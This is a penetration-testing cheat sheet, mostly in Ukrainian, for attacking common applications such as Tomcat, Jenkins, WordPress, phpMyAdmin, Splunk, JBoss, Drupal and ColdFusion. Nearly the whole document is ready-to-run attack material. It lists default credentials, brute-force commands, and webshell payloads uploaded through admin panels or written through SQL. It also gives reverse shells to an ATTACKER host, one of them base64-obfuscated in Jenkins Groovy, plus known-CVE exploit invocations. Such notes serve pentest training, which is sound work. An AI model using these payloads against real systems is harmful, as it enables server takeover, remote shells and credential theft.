# Attacking Common Applications

Для кожного знайденого застосунку: **версія → дефолтні креди → відома CVE → адмін-панель → RCE**.

---

## Apache Tomcat

**Default creds:** `tomcat:tomcat` · `admin:admin` · `tomcat:s3cret`
**Enum:**
```bash
gobuster dir -u http://TARGET:8080 -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt
curl -s http://TARGET:8080/manager/html  # 401 → є manager
```
**RCE через Manager WAR deploy:**
```bash
# Згенерувати WAR shell:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f war -o shell.war

# Upload через curl:
curl -u tomcat:tomcat http://TARGET:8080/manager/text/deploy?path=/shell \
     --upload-file shell.war

# Trigger:
curl http://TARGET:8080/shell/
```
**CVE-2019-0232** (CGI Servlet, Windows): RCE через `%3B` path traversal — перевір `/cgi-bin/`.
**CVE-2017-12617** (PUT enabled): `curl -X PUT http://TARGET/shell.jsp -d '<%Runtime.exec(request.getParameter("cmd"));%>'`

---

## Jenkins

**Default:** `admin:admin` · або без авторизації
**Enum:**
```bash
curl -s http://TARGET:8080/api/json?pretty=true   # версія і jobs
```
**RCE через Script Console (Groovy):**
```
Navigate: http://TARGET:8080/script
```
```groovy
// Linux:
def cmd = "id"
def proc = cmd.execute()
proc.waitFor()
println proc.text

// Reverse shell:
def cmd = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDMgMD4mMQ==}|{base64,-d}|bash"
cmd.execute()
```
**CVE-2024-23897** (LFI): `/jenkins/main.jelly?redirect=/etc/passwd`

---

## WordPress

```bash
# Повна enum:
wpscan --url http://TARGET --enumerate vp,vt,u,tt --api-token <TOKEN>
# Без токена:
wpscan --url http://TARGET --enumerate u,p

# Brute force admin:
wpscan --url http://TARGET -U admin -P rockyou.txt

# xmlrpc brute (швидше):
wpscan --url http://TARGET --password-attack xmlrpc -U admin -P rockyou.txt
```
**RCE (маєш admin):**
```
Appearance → Theme Editor → 404.php → вставити PHP shell → Save
curl http://TARGET/?p=404  (або навести на будь-який 404)
```
**Або:** Plugins → Add New → Upload Plugin → ZIP з shell.php всередині → Activate
**Dangerous plugins:** File Manager, WPForms old versions — перевір через wpscan `--plugins-detection aggressive`

---

## GitLab / Gitea / Gogs

```bash
# Реєстрація відкрита? → створи акаунт
# Public repos? → шукай secrets
curl http://TARGET/api/v4/projects?visibility=public  # GitLab API

# Пошук секретів у репо:
git clone http://TARGET/user/repo && cd repo
git log --all --oneline  # перевір старі commits
git show <hash>
grep -r "password\|secret\|key\|token" .
```
**CVE-2021-22205** (GitLab < 13.10.3): Remote Code Execution через ExifTool image upload — exploit на GitHub.
**CVE-2023-27482** (Gitea): SSRF через migration URL.

---

## phpMyAdmin

```bash
# Версія у заголовку або /doc/html/index.html
# Default: root (без пароля) · phpmyadmin:phpmyadmin
```
**SQL → File Write → RCE:**
```sql
SELECT "<?php system($_GET['cmd']); ?>"
INTO OUTFILE '/var/www/html/shell.php'
```
Потім: `http://TARGET/shell.php?cmd=id`

**Умова:** FILE привілей + знаємо webroot шлях (через phpinfo або LFI).

---

## Splunk Universal Forwarder

**Default:** `admin:changeme` · `admin:Welcome1`
```bash
# API на порту 8089:
curl -k https://TARGET:8089/services/server/info -u admin:changeme
```
**RCE (Splunk < 9.x):**
```bash
# PySplunkWhisperer2 або SplunkWhisperer:
python3 PySplunkWhisperer2_remote.py --host TARGET --lhost ATTACKER --lport 443 \
        --username admin --password changeme --payload "bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'"
```

---

## IIS / WebDAV

```bash
davtest -url http://TARGET/    # перевір дозволені методи
curl -X OPTIONS http://TARGET/ -v   # дивись Allow: заголовок

# Якщо PUT дозволений:
curl -X PUT http://TARGET/shell.aspx --data-binary @shell.aspx
curl -X MOVE http://TARGET/shell.txt -H "Destination: http://TARGET/shell.aspx"
```
**IIS Short Name** (8.3 filename enum):
```bash
java -jar iis-shortname-scanner.jar 2 20 http://TARGET/
# знаходить file/dir що починаються з відомих 6 символів
```

---

## JBoss / WildFly

**Admin console:** `:9990` (WildFly) · `:8080/jmx-console` (JBoss старий)
**RCE через deploy:**
```bash
# Завантаж WAR shell:
curl -u admin:admin http://TARGET:9990/management --digest \
     -H "Content-Type: application/json" -d @deploy.json
# deploy.json → JNDI або war deploy via management API
```
**CVE-2017-12149** (JBoss < 4.x): Безаутентифікаційний RCE через JMX console.

---

## Drupal

```bash
droopescan scan drupal -u http://TARGET   # enum версії і плагінів
```
**CVE-2018-7600** (Drupalgeddon2, Drupal < 8.5.1):
```bash
python3 drupalgeddon2.py http://TARGET  # автоматичний exploit на GitHub
# або через Metasploit: use exploit/unix/webapp/drupal_drupalgeddon2
```
**Маєш admin:** admin → Appearance → Install new theme → WAR/ZIP з shell.php.

---

## ColdFusion

**Admin:** `:8500/CFIDE/administrator/`
**Default:** `admin:admin`
**CVE-2010-2861** (Directory traversal): `/CFIDE/administrator/enter.cfm?locale=../../passwords/password.properties%00en`
**CVE-2023-26360** (CF 2018/2021): Unauthenticated RCE — перевір Metasploit.

---

## Пошук CVE для будь-якого застосунку

```bash
searchsploit "<application> <version>"
# або
curl -s "https://www.exploit-db.com/search?q=<app>" | grep -i rce

# Перевіряй завжди:
# 1. Версія (HTTP header, footer, /readme, /changelog)
# 2. Default credentials list (SecLists/Passwords/Default-Credentials/)
# 3. Адмін-панель → RCE через upload/template/script console
```

**Зв'язки:** [[Web-Recon]] · [[Ffuf-Fuzzing]] · [[File-Upload-Attacks]] · [[Shells-Payloads]] · [[Credentials]]
